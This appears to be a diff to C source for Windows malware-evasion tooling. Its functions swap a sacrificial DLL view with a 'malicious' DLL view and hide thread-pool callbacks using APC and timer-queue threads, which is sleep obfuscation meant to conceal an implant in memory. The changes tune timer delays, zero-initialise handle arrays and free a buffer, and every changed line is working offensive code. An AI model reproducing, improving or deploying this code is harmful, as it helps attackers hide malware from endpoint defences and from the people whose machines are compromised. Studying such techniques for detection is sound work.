@@ -12,7 +12,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
 
 
     /* --------- HIDING --------- */
-    HANDLE hThreads[6];
+    HANDLE hThreads[6] = {0};
     
 
     //starting the APC trigger thread
@@ -130,7 +130,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
 
 
     /* --------- FIXING --------- */
-    HANDLE hThreadsFix[6];
+    HANDLE hThreadsFix[6] = {0};
     
     //starting the APC trigger thread
     if (!NT_SUCCESS(ntFunctions->NtCreateThreadEx(&hThreadsFix[0], THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)ExitThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
@@ -574,11 +574,11 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     if (ResumeThreadValue != NULL && SafeCallback != NULL) {
         //these two need to be bit longer in order for the spoofing to work properly, needs more testing for a more precise waiting
         //i need to wait to enumerate all the callbacks before unmapping the view
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[0], 1000, 0, WT_EXECUTEINTIMERTHREAD);//unamp
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[1], 1100, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[4], 2000, 0, WT_EXECUTEINTIMERTHREAD);//hide callbacks
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[2], 21000, 0, WT_EXECUTEINTIMERTHREAD);//unmap
-        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[3], 21100, 0, WT_EXECUTEINTIMERTHREAD);//mapmal
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[0], 800, 0, WT_EXECUTEINTIMERTHREAD);//unamp
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[1], 900, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[4], 1000, 0, WT_EXECUTEINTIMERTHREAD);//hide callbacks
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[2], 20100, 0, WT_EXECUTEINTIMERTHREAD);//unmap
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)fnAddr->ResumeThreadAddress, ThreadArray[3], 20200, 0, WT_EXECUTEINTIMERTHREAD);//mapmal
 
         //TpWorkerFactory objects enumerated successfully so callbackArray now contains the addresses to fix
         if (EnumResumeThreadCallbacks(fnAddr->ResumeThreadAddress, callbackArray) == 0) {
@@ -631,6 +631,7 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
 	if (CtxFix) VirtualFree(CtxFix, 0, MEM_RELEASE);
 	if (CtxHide) VirtualFree(CtxHide, 0, MEM_RELEASE);
 	if (ResumeThreadValue) VirtualFree(ResumeThreadValue, 0, MEM_RELEASE);
+	if (SafeCallback) VirtualFree(SafeCallback, 0, MEM_RELEASE);
 	if (EvntHide) CloseHandle(EvntHide);
 	if (DummyEvent) CloseHandle(DummyEvent);
 
